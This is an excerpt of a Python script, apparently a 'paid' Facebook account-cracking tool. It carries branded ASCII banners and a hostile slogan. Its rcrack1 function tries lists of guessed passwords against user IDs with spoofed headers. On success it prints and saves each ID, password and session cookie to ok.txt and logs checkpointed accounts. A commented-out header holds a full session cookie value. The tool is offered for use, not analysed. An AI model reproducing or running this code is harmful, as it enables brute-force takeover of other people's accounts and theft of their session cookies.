...
| $$  \ $$| $$      | $$  | $$| $$  | $$| $$  | $$    | $$    
| $$$$$$$/| $$$$$$$$|  $$$$$$/|  $$$$$$/| $$$$$$$/    | $$    
|_______/ |________/ \______/  \______/ |_______/     |__/    
                                                              
                                                              
                                                              

\033[1;91m\033[1;41m\033[1;97m              WELCOME TO THE KINGDOM OF  BLOOD            \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PAID
\033[1;32m[-] AUTHOR    :\033[1;32m BLOODY LABIB 
\033[1;32m[-] GITHUB    :\033[1;32m BLOODY-LABIB
\033[1;32m[-] FACEBOOK  :\033[1;32m SOAIB MAHMUD LABIB 
\033[1;92m══════════════════════════════════════════

\033[1;91m<═══\033[1;41m\033[1;97m I SWEAR I REALLY FUCK YOUR SYSTEM\033[;0m\033[1;91m═══>\033[1;92m""")
...
def v1():
    ...
    print(' [♥] Ids saved in Bloody-ok.txt,cp.txt')
    print(50*'_')
def v2():
    user=[]
    os.system('clear')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mBLOODY\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    # 'cookie': 'datr=NUYyZUuin11Q9NyPJHFhjn5K; sb=NUYyZX4tEZRoE7Cz9uVt4jHH; wd=360x660; fr=041VN2EAiRFsjml2S..BlM1cg.Ub.AAA.0.0.BlM1eF.AWWFQW2h_Gw',
    'dpr': '2',
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[BLOODY-OK🌻] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {coki}")
                open('/sdcard/BLOODY/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[BLOODY-CP❌] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[BLOODY-LABIB👀] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
